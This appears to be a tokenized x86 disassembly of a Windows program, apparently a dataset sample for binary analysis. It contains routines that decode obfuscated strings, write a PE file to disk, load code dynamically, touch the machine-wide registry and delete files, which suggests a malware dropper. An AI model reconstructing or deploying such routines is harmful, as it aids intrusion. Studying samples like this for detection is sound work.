mov edx ecx
shr edx 0x10
mov [ eax + 0x5 ] dl
mov edx ecx
shr edx 0x8
mov [ eax + 0x6 ] dl
mov [ eax + 0x7 ] cl
mov ecx [ ebp - 0x10 ]
mov edx ecx
shr edx 0x18
mov [ eax + 0x8 ] dl
mov edx ecx
shr edx 0x10
mov [ eax + 0x9 ] dl
mov edx ecx
shr edx 0x8
mov [ eax + 0xa ] dl
mov [ eax + 0xb ] cl
mov ecx [ ebp - 0x14 ]
mov edx ecx
shr edx 0x18
mov [ eax + 0xc ] dl
mov edx ecx
shr edx 0x10
mov [ eax + 0xd ] dl
pop edi
mov edx ecx
shr edx 0x8
pop esi
mov [ eax + 0xe ] dl
mov [ eax + 0xf ] cl
pop ebx
leave
retn 0x8
sub_401fdf
push ebp
mov ebp esp
push ecx
push edi
mov edi [ ebp + 0x14 ]
test edi edi
mov [ ebp - 0x4 ] ecx
jle r-xdata
pop edi
leave
retn 0x10
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
sub esi [ ebp + 0xc ]
dec edi
shr edi 0x4
inc edi
mov dl [ esi + eax ]
xor dl [ eax ]
mov [ ecx + eax ] dl
inc eax
dec [ ebp + 0x14 ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
push ebx
push ebx
call sub_401121
push 0x10
push ebx
push [ ebp + 0x8 ]
call sub_405366
add [ ebp + 0xc ] 0x10
add esp 0xc
sub esi 0x10
add ebx 0x10
dec edi
jne r-xdata
mov eax [ ebp + 0xc ]
mov ecx ebx
sub ecx eax
mov [ ebp + 0x14 ] 0x10
pop esi
pop ebx
sub_402046
push ebp
mov ebp esp
sub esp 0xa14
push esi
mov esi 0x201
lea eax [ ebp - 0x408 ]
push esi
push eax
call sub_405388
lea eax [ ebp - 0x60c ]
push esi
push eax
call sub_405388
lea eax [ ebp - 0xa14 ]
push esi
push eax
call sub_405388
lea eax [ ebp - 0x204 ]
push esi
push eax
call sub_405388
add esp 0x20
xor esi esi
call sub_405fc3
mov [ ebp + esi * 4 - 0x810 ] eax
inc esi
cmp esi 0x40
jl r-xdata
mov esi 0x100
push esi
lea eax [ ebp - 0x204 ]
push rw-data
push eax
call j_sub_405366
lea eax [ ebp - 0x204 ]
push esi
push eax
push eax
call sub_4053c9
push esi
lea eax [ ebp - 0x204 ]
push eax
lea eax [ ebp - 0x810 ]
push eax
lea eax [ ebp - 0x408 ]
push eax
call sub_40224f
push esi
lea eax [ ebp - 0x408 ]
push eax
push [ ebp + 0x8 ]
call sub_4053c9
push esi
lea eax [ ebp - 0x204 ]
push eax
lea eax [ ebp - 0x408 ]
push eax
lea eax [ ebp - 0xa14 ]
push eax
lea eax [ ebp - 0x60c ]
push eax
call sub_4023d3
add esp 0x48
push esi
lea eax [ ebp - 0x60c ]
push eax
push [ ebp + 0xc ]
call sub_4053c9
add esp 0xc
pop esi
leave
retn
sub_402130
mov ecx [ esp + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
cmp esi ecx
jne r-xdata
push ebx
push edi
mov edi [ esp + 0x18 ]
xor ebx ebx
test edi edi
jle r-xdata
xor eax eax
pop esi
retn
xor eax eax
lea eax [ ecx + edi - 0x1 ]
sub esi ecx
xor eax eax
inc eax
jmp r-xdata
jb r-xdata
pop edi
pop ebx
pop esi
retn
or eax 0xffffffff
jmp r-xdata
inc ebx
dec eax
cmp ebx edi
jl r-xdata
mov cl [ esi + eax ]
mov dl [ eax ]
cmp cl dl
ja r-xdata
sub_402174
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x14 ]
test eax eax
mov [ ebp - 0x1 ] 0x0
jle r-xdata
leave
retn
mov ecx [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x10 ]
sub edi ecx
sub esi ecx
mov [ ebp + 0x14 ] eax
sub al [ edi + ecx ]
sub al [ ebp - 0x1 ]
mov [ ebp - 0x1 ] 0x1
movzx ebx [ ebp - 0x1 ]
movzx edx al
sub edx ebx
movzx ebx [ edi + ecx ]
cmp edx ebx
jl r-xdata
mov al [ ecx ]
cmp al [ ebp - 0x1 ]
jb r-xdata
pop edi
pop esi
pop ebx
sub al [ edi + ecx ]
sub al [ ebp - 0x1 ]
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
mov [ esi + ecx ] al
inc ecx
dec [ ebp + 0x14 ]
jne r-xdata
sub_4021d2
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x18 ]
test eax eax
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0x7 ] 0x0
jle r-xdata
leave
retn
mov ecx [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x10 ]
sub edi ecx
sub esi ecx
mov [ ebp + 0x18 ] eax
sub al [ ebp - 0x8 ]
sub al [ ebp - 0x1 ]
mov [ ebp - 0x1 ] 0x1
movzx ebx [ ebp - 0x1 ]
movzx edx al
sub edx ebx
movzx ebx [ ebp - 0x8 ]
cmp edx ebx
jl r-xdata
movzx ax [ ebp + 0x14 ]
movzx dx [ edi + ecx ]
imul dx ax
movzx ax [ ebp - 0x7 ]
add dx ax
mov al [ ecx ]
cmp al [ ebp - 0x1 ]
mov [ ebp - 0x8 ] dx
jb r-xdata
pop edi
pop esi
pop ebx
sub al [ ebp - 0x8 ]
sub al [ ebp - 0x1 ]
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
mov [ esi + ecx ] al
inc ecx
dec [ ebp + 0x18 ]
jne r-xdata
sub_40224f
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0x14 ]
test esi esi
push edi
jle r-xdata
xor edi edi
test esi esi
mov [ ebp + 0x14 ] edi
jle r-xdata
mov ecx [ ebp + 0xc ]
mov edi eax
sub ecx eax
mov edx esi
mov ecx [ ebp + 0x10 ]
sub ecx edi
movzx cx [ ecx + esi - 0x1 ]
inc cx
movzx ecx cx
mov [ ebp - 0x4 ] ecx
lea ecx [ edi + 0x1 ]
cmp ecx 0x1
jl r-xdata
mov ecx [ ebp + 0x10 ]
lea ecx [ ecx + esi - 0x1 ]
mov bl [ ecx + edi ]
mov [ edi ] bl
inc edi
dec edx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea ebx [ eax + esi - 0x1 ]
add edi eax
mov [ ebp - 0x10 ] ecx
inc edi
dec ecx
cmp edi esi
mov [ ebp + 0x14 ] edi
jl r-xdata
dec ebx
dec edi
dec [ ebp - 0x10 ]
jne r-xdata
movzx ecx [ ebp - 0x4 ]
movzx eax ax
cdq
idiv ecx
test al al
mov [ ebp - 0x8 ] al
je r-xdata
cmp [ ecx ] 0x0
jne r-xdata
movzx eax [ ebx ]
test ax ax
je r-xdata
mov eax esi
sub eax [ ebp + 0x14 ]
push eax
push [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
push edi
call sub_402130
add esp 0xc
jmp r-xdata
mov eax esi
sub eax [ ebp + 0x14 ]
inc eax
mov [ ebp - 0xc ] eax
test eax eax
jg r-xdata
push [ ebp - 0xc ]
push [ ebp - 0x8 ]
push [ ebp + 0x10 ]
push edi
push edi
call sub_4021d2
movzx eax [ ebx ]
movzx ecx [ ebp - 0x4 ]
cdq
idiv ecx
add esp 0x14
test al al
mov [ ebp - 0x8 ] al
jne r-xdata
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push edi
push edi
call sub_402174
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push edi
call sub_402130
add esp 0x1c
sub_402347
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x18 ]
test edi edi
jle r-xdata
and [ ebp + 0x18 ] 0x0
test edi edi
jle r-xdata
push edi
push 0x0
push ebx
call sub_404b0e
add esp 0xc
lea eax [ edi + edi ]
push eax
push [ ebp + 0x14 ]
push ebx
push ebx
call sub_40224f
add esp 0x10
pop edi
pop ebx
leave
retn
mov eax [ ebp + 0xc ]
sub eax ebx
push esi
mov esi ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
movzx ax [ ecx + eax ]
mov ebx [ ebp - 0x4 ]
movzx bx [ ebx + esi ]
imul ax bx
movzx bx [ esi + ecx ]
movzx dx dl
add ax bx
add ax dx
mov [ esi + ecx ] al
inc ecx
cmp ecx edi
mov dl ah
jl r-xdata
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x18 ]
lea eax [ ebx + edi ]
add eax ecx
add [ eax ] dl
inc [ ebp + 0x18 ]
inc esi
cmp [ ebp + 0x18 ] edi
jl r-xdata
xor dl dl
xor ecx ecx
pop esi
sub_4023d3
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x18 ]
push edi
push [ ebp + 0x10 ]
push esi
call j_sub_405366
add esp 0xc
push 0x10
pop ebx
push edi
push [ ebp + 0x14 ]
push esi
push esi
push [ ebp + 0x8 ]
call sub_402347
push edi
push [ ebp + 0x8 ]
push esi
call j_sub_405366
add esp 0x20
dec ebx
jne r-xdata
push edi
push [ ebp + 0x14 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_402347
add esp 0x14
pop edi
pop esi
pop ebx
pop ebp
retn
sub_40242c
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
xor ebx ebx
push edi
xor edx edx
lea ecx [ esi - 0x100 ]
mov eax 0x100
mov [ ecx + edx ] dl
inc edx
cmp edx eax
jl r-xdata
mov [ esi - 0x102 ] bl
xor dl dl
mov [ esi - 0x205 ] bl
mov [ ebp - 0x8 ] eax
movzx ebx dl
mov dl [ ecx ]
mov [ ebp - 0x1 ] dl
lea edi [ ebx + esi - 0x100 ]
mov dl [ edi ]
mov [ ecx ] dl
mov dl [ ebp - 0x1 ]
inc eax
mov [ edi ] dl
cdq
idiv [ ebp + 0xc ]
inc ecx
dec [ ebp - 0x8 ]
jne r-xdata
dec edx
or edx 0xffffff00
inc edx
movzx edi [ ecx ]
movzx eax dl
mov edx [ ebp + 0x8 ]
movzx edx [ eax + edx ]
add edx ebx
add edx edi
and edx 0x800000ff
jns r-xdata
push 0x100
lea eax [ esi - 0x100 ]
push eax
lea eax [ esi - 0x203 ]
push eax
call sub_405366
mov al [ esi - 0x205 ]
add esp 0xc
mov [ esi - 0x204 ] al
mov al [ esi - 0x102 ]
pop edi
mov [ esi - 0x101 ] al
pop esi
pop ebx
leave
retn 0x8
sub_4024dc
push esi
mov esi ecx
push 0x100
lea eax [ esi - 0x203 ]
push eax
lea eax [ esi - 0x100 ]
push eax
call sub_405366
mov al [ esi - 0x204 ]
mov [ esi - 0x205 ] al
mov al [ esi - 0x101 ]
add esp 0xc
mov [ esi - 0x102 ] al
pop esi
retn
sub_402514
movzx eax [ ecx - 0x205 ]
inc eax
and eax 0x800000ff
push ebx
push esi
jns r-xdata
movzx esi [ ecx - 0x102 ]
movzx edx al
mov [ ecx - 0x205 ] al
movzx edx [ edx + ecx - 0x100 ]
add edx esi
and edx 0x800000ff
jns r-xdata
dec eax
or eax 0xffffff00
inc eax
mov [ ecx - 0x102 ] dl
movzx eax al
movzx edx dl
lea esi [ eax + ecx - 0x100 ]
mov al [ esi ]
lea edx [ edx + ecx - 0x100 ]
mov bl [ edx ]
mov [ esi ] bl
mov [ edx ] al
movzx eax [ ecx - 0x102 ]
movzx edx [ ecx - 0x205 ]
movzx eax [ eax + ecx - 0x100 ]
movzx edx [ edx + ecx - 0x100 ]
add eax edx
and eax 0x800000ff
jns r-xdata
dec edx
or edx 0xffffff00
inc edx
mov [ ecx - 0x103 ] al
movzx eax al
mov al [ eax + ecx - 0x100 ]
xor al [ esp + 0xc ]
pop esi
mov [ ecx - 0x206 ] al
pop ebx
retn 0x4
dec eax
or eax 0xffffff00
inc eax
sub_4025c5
mov ecx [ esp + 0x4 ]
mov eax ecx
shr eax 0x10
xor ecx eax
mov eax ecx
shr eax 0x8
xor ecx eax
mov eax ecx
shr eax 0x4
xor ecx eax
mov eax ecx
shr eax 0x2
xor ecx eax
mov eax ecx
shr eax 0x1
xor eax ecx
and eax 0x1
retn 0x4
sub_4025f1
xor ecx ecx
xor eax eax
cmp [ esp + 0x4 ] eax
setne cl
xor edx edx
cmp [ esp + 0x8 ] eax
setne dl
add ecx edx
xor edx edx
cmp [ esp + 0xc ] eax
setne dl
add ecx edx
cmp ecx 0x2
setge al
retn 0xc
sub_40261b
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov edi [ esi + 0x10 ]
mov eax edi
and eax 0x80
push eax
mov eax edi
and eax 0x8
push eax
mov eax edi
and eax 0x400
push eax
call sub_4025f1
cmp [ ebp + 0x8 ] 0x0
mov ebx [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
jne r-xdata
mov edx [ esi + 0x4 ]
mov eax edx
and eax 0x72000
push eax
mov ecx esi
call sub_4025c5
and edx 0x3ffff
mov ecx ebx
shl ecx 0xe
or edx ecx
add edx edx
or eax edx
cmp [ ebp + 0x8 ] 0x0
mov [ esi + 0x4 ] eax
jne r-xdata
mov ecx edi
shr ecx 0xa
and ecx 0x1
cmp ecx eax
jne r-xdata
mov edx [ esi + 0x8 ]
mov eax edx
and eax 0x300000
push eax
mov ecx esi
call sub_4025c5
and edx 0x1fffff
mov ecx ebx
shl ecx 0xf
or edx ecx
add edx edx
or eax edx
cmp [ ebp + 0x8 ] 0x0
mov [ esi + 0x8 ] eax
jne r-xdata
mov eax edi
shr eax 0x3
and eax 0x1
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edx [ esi + 0xc ]
mov eax edx
and eax 0x700080
push eax
mov ecx esi
call sub_4025c5
and edx 0x3fffff
mov ecx ebx
shl ecx 0x11
or edx ecx
add edx edx
or eax edx
mov [ esi + 0xc ] eax
mov eax edi
shr eax 0x7
and eax 0x1
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax edi
and eax 0x10800
push eax
mov ecx esi
call sub_4025c5
movzx ecx di
shl ebx 0x9
or ecx ebx
add ecx ecx
or eax ecx
pop edi
mov [ esi + 0x10 ] eax
pop esi
pop ebx
leave
retn 0x8
sub_402717
push ecx
push ebx
push ebp
push esi
push edi
mov edi ecx
mov eax [ edi + 0x24 ]
mov ebx [ edi + 0x8 ]
mov esi [ edi + 0xc ]
mov [ esp + 0x10 ] eax
mov eax [ edi + 0x4 ]
mov ecx eax
and ecx 0x1000
push ecx
mov ecx eax
not ecx
and ecx 0x4000
push ecx
and eax 0x8000
push eax
mov ecx edi
call sub_4025f1
mov ebp eax
mov eax ebx
and eax 0x200
push eax
mov eax ebx
and eax 0x2000
push eax
mov eax ebx
not eax
and eax 0x10000
push eax
mov ecx edi
call sub_4025f1
xor ebp eax
mov eax esi
not eax
and eax 0x2000
push eax
mov eax esi
and eax 0x10000
push eax
mov eax esi
and eax 0x40000
push eax
mov ecx edi
call sub_4025f1
shr esi 0x1
xor esi ebx
shr esi 0x3
xor esi [ edi + 0x4 ]
xor ebp eax
mov eax [ esp + 0x10 ]
shr esi 0x12
and esi 0x1
xor ebp esi
mov [ edi + 0x24 ] ebp
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
sub_4027b6
push ebx
xor eax eax
push esi
mov esi ecx
push edi
xor edi edi
xor ebx ebx
mov [ esi - 0x4 ] eax
mov [ esi - 0x18 ] eax
mov [ esi - 0x1c ] eax
mov [ esi - 0x20 ] eax
mov [ esi - 0x24 ] eax
inc edi
jmp r-xdata
push eax
push edi
lea ecx [ esi - 0x28 ]
call sub_40261b
mov ecx [ esp + 0x10 ]
mov eax ebx
cdq
and edx 0x7
add eax edx
sar eax 0x3
movzx eax [ eax + ecx ]
movzx ecx bl
and ecx 0x7
shr eax cl
and eax edi
xor [ esi - 0x24 ] eax
xor [ esi - 0x20 ] eax
xor [ esi - 0x1c ] eax
xor [ esi - 0x18 ] eax
inc ebx
cmp ebx 0x40
jl r-xdata
xor eax eax
xor ebx ebx
xor eax eax
cmp ebx 0x15
sete al
lea ecx [ esi - 0x28 ]
push eax
push edi
call sub_40261b
mov eax [ esp + 0x14 ]
mov ecx ebx
sar eax cl
and eax edi
xor [ esi - 0x24 ] eax
xor [ esi - 0x20 ] eax
xor [ esi - 0x1c ] eax
xor [ esi - 0x18 ] eax
inc ebx
cmp ebx 0x16
jl r-xdata
push 0x64
pop edi
push 0x0
push 0x0
lea ecx [ esi - 0x28 ]
call sub_40261b
dec edi
jne r-xdata
lea ecx [ esi - 0x28 ]
call sub_402717
mov eax [ esi - 0x24 ]
mov [ esi - 0x14 ] eax
mov eax [ esi - 0x20 ]
mov [ esi - 0x10 ] eax
mov eax [ esi - 0x1c ]
mov [ esi - 0xc ] eax
mov eax [ esi - 0x18 ]
pop edi
mov [ esi - 0x8 ] eax
pop esi
pop ebx
retn 0x8
sub_402896
push ebx
push esi
push edi
xor bl bl
xor esi esi
lea edi [ ecx - 0x28 ]
push 0x0
push 0x0
mov ecx edi
call sub_40261b
mov ecx edi
call sub_402717
mov edx esi
and edx 0x7
push 0x7
pop ecx
sub ecx edx
shl al cl
or bl al
inc esi
cmp esi 0x8
jl r-xdata
pop edi
mov al bl
xor al [ esp + 0xc ]
pop esi
pop ebx
retn 0x4
sub_4028d2
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
mov esi ecx
xor ebx ebx
call sub_405fc3
mov [ edi + ebx * 4 ] eax
inc ebx
cmp ebx 0x2
jb r-xdata
push 0x8
pop ebx
push ebx
lea eax [ edi + 0x8 ]
push edi
push eax
call sub_405366
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add esp 0xc
lea ecx [ eax + esi ]
mov eax [ ecx ]
push ebx
push edi
call [ eax ]
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
mov eax [ eax + 0x4 ]
add eax esi
push [ eax + 0x4 ]
add ecx esi
mov edx [ ecx ]
add eax ebx
push eax
call [ edx ]
cmp [ esp + 0x14 ] ebx
jle r-xdata
mov eax [ esp + 0x14 ]
pop edi
pop esi
pop ebx
retn 0x8
mov eax [ esi ]
mov eax [ eax + 0x8 ]
movzx edx [ ebx + edi ]
lea ecx [ eax + esi ]
mov eax [ ecx ]
push edx
call [ eax + 0x8 ]
mov [ ebx + edi ] al
inc ebx
cmp ebx [ esp + 0x14 ]
jl r-xdata
sub_40294c
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
lea eax [ esi + 0x5 ]
push 0x8
push eax
call sub_405388
cmp [ ebp + 0xc ] 0x10
pop ecx
pop ecx
jae r-xdata
push edi
xor edi edi
cmp [ ebp + 0xc ] edi
mov [ esi + 0x4 ] 0x0
mov [ esi + 0xd ] edi
jle r-xdata
xor eax eax
jmp r-xdata
mov eax [ esi + 0xd ]
pop edi
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
push ebx
pop esi
leave
retn 0x8
mov eax [ esi ]
mov eax [ eax + 0x8 ]
mov ebx [ ebp - 0x4 ]
movzx edx [ ebx ]
lea ecx [ eax + esi ]
mov eax [ ecx ]
push edx
call [ eax + 0x8 ]
mov [ ebx ] al
mov eax [ ebp + 0x8 ]
lea eax [ edi + eax + 0x8 ]
push 0x8
push eax
lea eax [ esi + 0x5 ]
push eax
call sub_405366
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add esp 0xc
push 0x8
push [ ebp - 0x4 ]
lea ecx [ eax + esi ]
mov eax [ ecx ]
call [ eax ]
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
mov eax [ eax + 0x4 ]
add eax esi
push [ eax + 0x4 ]
add ecx esi
mov edx [ ecx ]
add eax 0x8
push eax
call [ edx ]
xor ebx ebx
cmp [ esi + 0x4 ] 0x0
jne r-xdata
pop ebx
push 0x8
lea eax [ esi + 0x5 ]
push eax
push [ ebp - 0x4 ]
call sub_4053a4
add esp 0xc
test al al
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x8 ]
movzx edx [ esi + ebx + 0x5 ]
lea ecx [ eax + esi ]
mov eax [ ecx ]
push edx
call [ eax + 0x8 ]
mov [ esi + ebx + 0x5 ] al
inc ebx
cmp ebx 0x8
jb r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
dec edi
dec [ ebp - 0x4 ]
lea eax [ edi + eax + 0x1 ]
add edi 0x10
add [ ebp - 0x4 ] 0x10
mov [ esi + 0x4 ] 0x1
mov [ esi + 0xd ] eax
jmp r-xdata
lea eax [ ebx + edi ]
cmp eax [ ebp + 0xc ]
jge r-xdata
inc edi
inc [ ebp - 0x4 ]
cmp edi [ ebp + 0xc ]
jl r-xdata
sub_402a59
push esi
push [ esp + 0xc ]
mov esi ecx
mov eax [ esi ]
mov eax [ eax + 0x8 ]
push [ esp + 0xc ]
lea ecx [ eax + esi ]
mov eax [ ecx ]
call [ eax ]
push [ esp + 0xc ]
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
push [ esp + 0xc ]
add ecx esi
call sub_404912
pop esi
retn 0x8
sub_402a88
push ebp
mov ebp esp
sub esp 0x104
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0xdd
jne r-xdata
push edi
push 0x6
push esi
lea ecx [ ebp - 0x104 ]
call sub_405424
lea edi [ esi + 0x6 ]
push edi
lea ecx [ ebp - 0x104 ]
call sub_4054a2
mov eax edi
mov [ esi ] 0xdd
mov [ esi + 0x1 ] 0xb1
mov [ esi + 0x2 ] 0x97
mov [ esi + 0x3 ] 0xb5
mov [ esi + 0x4 ] 0xf2
mov [ esi + 0x5 ] 0x9b
pop edi
cmp [ esi + 0x1 ] 0xb1
jne r-xdata
cmp [ esi + 0x2 ] 0x97
jne r-xdata
cmp [ esi + 0x3 ] 0xb5
jne r-xdata
cmp [ esi + 0x4 ] 0xf2
jne r-xdata
cmp [ esi + 0x5 ] 0x9b
jne r-xdata
lea eax [ esi + 0x6 ]
jmp r-xdata
pop esi
leave
retn
sub_402af8
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0x5a4d
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0x4 ] 0x14c
jne r-xdata
retn 0x8
mov ax [ eax + 0x16 ]
and ax 0x2000
neg ax
sbb eax eax
inc eax
inc eax
sub_402b2e
push ebp
mov ebp esp
sub esp 0x940
push esi
push 0x0
push [ ebp + 0x8 ]
lea eax [ ebp - 0x540 ]
push eax
mov [ ebp - 0x540 ] 0x0
call sub_409cdd
push [ ebp + 0xc ]
lea eax [ ebp - 0x540 ]
push eax
call sub_409cb9
add esp 0x14
lea eax [ ebp - 0x140 ]
push eax
lea eax [ ebp - 0x540 ]
push eax
call [ FindFirstFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
pop esi
leave
retn 0x8
test [ ebp - 0x140 ] 0x10
jne r-xdata
lea eax [ ebp - 0x140 ]
push eax
push esi
call [ FindNextFileA@IAT ]
test eax eax
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
lea eax [ ebp - 0x940 ]
push eax
mov [ ebp - 0x940 ] 0x0
call sub_409cdd
lea eax [ ebp - 0x114 ]
push eax
lea eax [ ebp - 0x940 ]
push eax
call sub_409cb9
add esp 0x14
lea eax [ ebp - 0x940 ]
push eax
call [ DeleteFileA@IAT ]
push esi
call [ FindClose@IAT ]
sub_402bdf
cmp [ esp + 0x8 ] 0x1
push esi
mov esi ecx
jne r-xdata
cmp [ esp + 0xc ] 0x2
jne r-xdata
push [ esp + 0x8 ]
call [ LoadLibraryA@IAT ]
pop esi
retn 0xc
mov eax [ esi + 0x108 ]
test eax eax
je r-xdata
push 0x0
push [ esp + 0xc ]
call eax
sub_402c10
push ebp
mov ebp esp
push ebx
push edi
xor ebx ebx
push ebx
push 0x80
push 0x1
push ebx
push 0x1
push 0x40000000
push [ ebp + 0x8 ]
call [ CreateFileA@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
push esi
mov esi [ ebp + 0x10 ]
push ebx
lea eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
add esi 0xfffffff0
push esi
add eax 0x10
push eax
push edi
call [ WriteFile@IAT ]
cmp esi [ ebp + 0x8 ]
pop esi
je r-xdata
xor al al
mov bl 0x1
jmp r-xdata
push edi
call [ CloseHandle@IAT ]
mov al bl
jmp r-xdata
pop edi
pop ebx
pop ebp
retn 0xc
sub_402c6f
push esi
mov esi ecx
and [ esi + 0x108 ] 0x0
push edi
push rw-data
mov [ esi ] rw-data
mov [ esi + 0x4 ] 0x0
call sub_402a88
pop ecx
push eax
call [ LoadLibraryA@IAT ]
mov edi eax
test edi edi
je r-xdata
pop edi
mov eax esi
pop esi
retn
push rw-data
call sub_402a88
pop ecx
push eax
push edi
call [ GetProcAddress@IAT ]
mov [ esi + 0x108 ] eax
sub_402cbd
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
sub esp 0x404
cmp eax 0x20
push esi
mov esi ecx
jae r-xdata
add eax 0xfffffff0
push ebx
push eax
mov eax [ ebp + 0x8 ]
add eax 0x10
push eax
call sub_402af8
mov ebx eax
test ebx ebx
jne r-xdata
xor al al
jmp r-xdata
and [ ebp - 0x4 ] 0x0
push edi
xor al al
jmp r-xdata
pop esi
leave
retn 0x8
cmp ebx 0x2
jne r-xdata
push rw-data
call sub_402a88
push eax
lea eax [ ebp - 0x404 ]
push eax
call sub_409cb9
add esp 0xc
pop ebx
push [ ebp + 0xc ]
lea eax [ ebp - 0x404 ]
push [ ebp + 0x8 ]
mov ecx esi
push eax
call sub_402c10
test al al
jne r-xdata
push rw-data
call sub_402a88
push eax
lea eax [ ebp - 0x404 ]
push eax
call sub_409cb9
add esp 0xc
mov eax [ esi ]
push 0x80000002
push ebx
lea ecx [ ebp - 0x404 ]
push ecx
mov ecx esi
call [ eax ]
mov al 0x1
jmp r-xdata
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x40
jl r-xdata
pop edi
mov eax [ esi ]
lea ecx [ ebp - 0x404 ]
push ecx
mov ecx esi
call [ eax + 0x8 ]
push rw-data
lea eax [ ebp - 0x404 ]
push eax
mov ecx esi
call sub_402b2e
mov edi [ esi ]
lea eax [ ebp - 0x404 ]
push eax
add edi 0x4
call sub_409c88
pop ecx
push eax
mov ecx esi
call [ edi ]
cmp ebx 0x1
jne r-xdata
sub_402db4
mov eax [ ecx + 0x208 ]
mov [ ecx ] rw-data
mov eax [ eax + 0x4 ]
mov [ eax + ecx + 0x208 ] rw-data
mov eax [ ecx + 0x208 ]
mov eax [ eax + 0x8 ]
mov [ eax + ecx + 0x208 ] rw-data
mov eax [ ecx + 0x208 ]
mov eax [ eax + 0xc ]
mov [ eax + ecx + 0x208 ] rw-data
mov eax [ ecx + 0x208 ]
mov eax [ eax + 0x14 ]
mov [ eax + ecx + 0x208 ] rw-data
mov eax [ ecx + 0x208 ]
mov eax [ eax + 0x14 ]
mov [ eax + ecx + 0x210 ] rw-data
jmp sub_40adc0
sub_402e43
push esi
mov esi ecx
mov eax [ esi + 0x208 ]
mov [ esi ] rw-data
lea ecx [ esi + 0x246 ]
mov [ ecx ] rw-data
mov eax [ eax + 0x4 ]
mov [ eax + esi + 0x208 ] rw-data
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x8 ]
mov [ eax + esi + 0x208 ] rw-data
mov eax [ esi + 0x208 ]
mov eax [ eax + 0xc ]
mov [ eax + esi + 0x208 ] rw-data
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov [ eax + esi + 0x208 ] rw-data
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov [ eax + esi + 0x210 ] rw-data
mov eax [ esi + 0x208 ]
mov eax [ eax + 0xc ]
lea edx [ eax - 0x1d1e ]
mov [ eax + esi + 0x204 ] edx
call sub_409062
mov ecx esi
pop esi
jmp sub_402db4
sub_402ee2
push ebp
lea ebp [ esp - 0x78 ]
sub esp 0x11c8
push esi
mov esi ecx
lea ecx [ esi + 0x258b ]
mov [ ebp + 0x70 ] ecx
call sub_40609d
mov eax [ esi ]
mov ecx esi
call [ eax + 0x10 ]
test al al
jne r-xdata
mov ecx [ ebp + 0x70 ]
call sub_406192
xor eax eax
pop esi
add ebp 0x78
leave
retn
push ebx
xor ebx ebx
push edi
call sub_40a5dc
mov [ esi + 0x8 ] bl
call sub_40a5f2
jmp r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x10 ]
test al al
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x10 ]
test al al
jne r-xdata
lea ecx [ esi + 0x1e2b ]
mov [ esi + 0x8 ] bl
call sub_40abb6
lea ecx [ esi + 0x204d ]
call sub_40abb6
cmp al bl
mov [ esi + 0x2589 ] al
je r-xdata
cmp [ esi + 0x2589 ] bl
lea ecx [ esi + 0x1e2b ]
jne r-xdata
pop edi
pop ebx
push ebx
lea eax [ ebp - 0x950 ]
lea edi [ esi + 0x246 ]
push eax
mov ecx edi
mov [ ebp - 0x950 ] bl
call sub_409790
lea eax [ ebp - 0x150 ]
push eax
lea eax [ ebp - 0x950 ]
push eax
call [ FindFirstFileA@IAT ]
cmp eax 0xffffffff
mov [ ebp + 0x74 ] eax
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x10 ]
test al al
jne r-xdata
test [ ebp - 0x150 ] 0x10
jne r-xdata
mov eax [ esi + 0x2584 ]
imul eax eax 0x3e8
push eax
call [ Sleep@IAT ]
lea eax [ ebp - 0x150 ]
push eax
push [ ebp + 0x74 ]
